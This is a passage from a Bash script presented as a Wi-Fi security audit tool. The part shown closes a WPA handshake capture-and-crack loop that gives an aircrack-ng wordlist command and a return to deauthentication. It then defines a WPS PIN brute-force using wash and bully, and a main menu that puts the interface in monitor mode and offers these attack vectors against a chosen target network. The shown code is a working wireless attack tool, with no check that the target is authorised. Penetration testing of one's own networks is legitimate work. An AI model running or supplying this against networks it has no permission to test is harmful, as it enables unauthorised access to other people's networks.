            elif [[ -f "$cap_file" ]]; then
                log_info "Capture file saved at: $cap_file"
                log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> '$cap_file'"
                return 0
            else
                log_warn "Capture file not found."
            fi

            # Menu to retry if cracking failed
            printf '\nCracking attempt finished/failed.\n'
            printf 'Options:\n'
            printf 'r) Return to Deauth Menu (Try capturing again)\n'
            printf 'x) Exit this attack\n'
            
            local post_crack
            read -r -p "Selection [r/x] (Default: r): " post_crack
            post_crack="${post_crack:-r}"
            
            if [[ "${post_crack,,}" == "r" ]]; then
                continue 2  # continue L1 → full restart with new timestamp
            else
                return 0
            fi
        done
    done
}

# -----------------------------------------------------------------------------
# ATTACK: WPS
# -----------------------------------------------------------------------------
attack_wps() {
    log_info "Starting WPS Scan via 'wash'..."
    
    timeout --signal=SIGTERM 15s wash -i "$MON_IFACE" 2>/dev/null | \
        grep -i -- "$TARGET_BSSID" || true
    
    log_info "Attempting WPS PIXIE/Bruteforce via 'bully'..."
    log_warn "This may take a very long time. Press Ctrl+C to abort."
    
    bully -b "$TARGET_BSSID" -c "$TARGET_CH" -v 3 -- "$MON_IFACE" || {
        log_warn "Bully exited with error or was interrupted."
    }
}

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
main() {
    printf '========================================\n'
    printf '   Arch/Hyprland Wi-Fi Security Audit   \n'
    printf '========================================\n'
    printf 'Version: 2.2.1 (Bugfixes) | PID: %d\n' "$$"
    printf '\n'

    check_deps
    setup_directories
    select_interface
    enable_monitor_mode

    while true; do
        scan_targets

        local should_rescan=0
        while true; do
            printf '\n'
            printf 'Select Attack Vector:\n'
            printf '1) WPA Handshake Capture + Crack\n'
            printf '2) WPS Attack (Bully)\n'
            printf '3) Rescan Targets\n'
            printf '4) Exit\n'

            local attack_choice
            read -r -p "Choice [1]: " attack_choice
            attack_choice="${attack_choice:-1}"

            case "$attack_choice" in
                1)
                    local result=0
                    # The || result=$? trick prevents 'set -e' from crashing the script
                    # when the function returns 2 (Back to Target)
                    attack_wpa_handshake || result=$?

                    if ((result == 2)); then
                        log_info "Returning to network scan..."
                        should_rescan=1
                    fi
                    break
                    ;;
                2)
                    attack_wps
                    break
                    ;;
                3)
                    log_info "Restarting scan..."
                    should_rescan=1
                    break
                    ;;
                4)
                    log_info "Exiting."
                    exit 0
                    ;;
                *)
                    log_err "Invalid choice."
                    ;;
            esac
        done

        ((should_rescan)) && continue
        break
    done

    printf '\n'
    read -r -p "Press ENTER to cleanup and exit..."
}

main "$@"
